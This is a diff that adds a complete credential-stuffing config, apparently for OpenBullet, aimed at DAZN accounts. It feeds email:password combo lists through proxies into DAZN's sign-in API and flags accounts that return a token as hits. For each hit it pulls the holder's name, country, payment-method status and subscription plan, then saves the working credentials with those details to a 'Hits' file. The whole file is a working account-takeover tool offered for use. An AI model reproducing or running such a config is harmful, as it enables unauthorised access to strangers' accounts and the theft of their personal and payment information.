@@ -1,0 +1,161 @@
+[SETTINGS]
+{
+  "Name": "DAZN",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-18T10:42:09.7588279-08:00",
+  "AdditionalInfo": "@dazn",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Length FUNCTION Length "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"DeviceId\":\"007dd101cc\"}" -> VAR "len" 
+
+#Login REQUEST POST "https://isl-eu.dazn.com/misl/eu/v5/SignIn" 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"DeviceId\":\"007dd101cc\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: isl-eu.dazn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.dazn.com/de-DE/account/signin" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Content-Length: <len>" 
+  HEADER "Connection: keep-alive" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "InvalidPassword" 
+    KEY "Request limiting policy has been breached" 
+  KEYCHAIN Success OR 
+    KEY "Token\":\"" 
+
+#Token PARSE "<SOURCE>" JSON "Token" -> VAR "token" 
+
+#Account REQUEST GET "https://www.dazn.com/de-DE/account/payment-plan" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PRINT "<ADDRESS>"
+IF "<ADDRESS>" EqualTo "https://www.dazn.com/de-DE/account/payment-plan"
+SET CAP "Plan" "No"
+ELSE
+SET CAP "Plan" "Yes"
+ENDIF
+
+#RenewToken REQUEST POST "https://isl-eu.dazn.com/misl/eu/v5/RefreshAccessToken" 
+  CONTENT "{\"DeviceId\":\"007dd101cc\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: isl-eu.dazn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.dazn.com/de-DE/account/" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Session-Id: b6253f5e-a8bb-4241-8609-2a160691e326" 
+  HEADER "Content-Length: 25" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "TE: Trailers" 
+
+#Token2 PARSE "<SOURCE>" JSON "Token" -> VAR "token2" 
+
+#Account REQUEST GET "https://isl-eu.dazn.com/misl/eu/v1/UserProfile" 
+  
+  HEADER "Host: isl-eu.dazn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.dazn.com/de-DE/account/" 
+  HEADER "Authorization: Bearer <token2>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "TE: Trailers" 
+
+#Firstname PARSE "<SOURCE>" JSON "FirstName" -> CAP "Firstname" 
+
+#Lastname PARSE "<SOURCE>" JSON "LastName" -> CAP "Lastname" 
+
+#Country PARSE "<SOURCE>" JSON "UserCountryCode" -> CAP "Country" 
+
+#Payment PARSE "<SOURCE>" JSON "HasSetPaymentMethod" -> VAR "Payment_" 
+
+IF "<Payment_>" EqualTo "False"
+SET CAP "Payment" "No"
+ELSE
+SET CAP "Payment" "Yes"
+ENDIF
+
+#Geolocation REQUEST GET "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location" 
+  
+  HEADER "Host: geolocation.onetrust.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.dazn.com/de-DE/account" 
+
+#GeoData PARSE "<SOURCE>" LR "\",\"stateName\":\"" "\"" -> CAP "State" 
+
+#GeoData2 PARSE "<SOURCE>" LR "\",\"zipcode\":\"" "\"" -> CAP "Zipcode" 
+
+#GeoData3 PARSE "<SOURCE>" LR "\",\"city\":\"" "\"" -> CAP "City" 
+
+#GeoData4 PARSE "<SOURCE>" LR "\",\"timezone\":\"" "\"" -> CAP "Timezone" 
+
+#Save_Hits UTILITY File "DAZN Hits.txt" AppendLines "~ ~ ~ ~ < 💚 D A Z N 💚 > ~ ~ ~ ~\\n\\nCombo : <USER>:<PASS>\\nName : <Lastname>\\nAdresse : <Firstname>\\nCountry : <Country>\\nPayment : <Payment>\\nPlan : <Plan>\\nProxy-Location : <City>, <State> <Zipcode>, <Timezone>\\nLogin : https://www.dazn.de/login\\n- - - Config By MrBlackX - - -\\n\\n~ ~ ~ ~ < 💚 C O N F I G 💚 > ~ ~ ~ ~\\n" -> CAP "Save Hits" 
+
